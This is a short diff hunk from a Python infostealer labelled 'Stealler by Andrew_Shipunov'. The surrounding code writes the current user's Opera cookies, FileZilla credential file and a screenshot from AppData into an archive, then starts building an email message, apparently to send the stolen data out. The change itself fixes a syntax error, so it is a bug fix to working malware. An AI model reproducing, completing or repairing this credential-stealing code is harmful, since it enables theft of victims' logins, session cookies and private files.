@@ -271,7 +271,7 @@ NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\opera_cookies
 NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\filezilla.txt')
 NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sreenshot.jpg')
 NZ.close()
-doc = 'C:\\Users\\' + getpass.getuser(
+doc = 'C:\\Users\\' + getpass.getuser()
 '↑Stealler by Andrew_Shipunov↑'.encode('utf-8')
 msgtext = MIMEText('↑Stealler by Andrew_Shipunov↑'.encode('utf-8'), 'plain', 'utf-8')
 msg = MIMEMultipart()
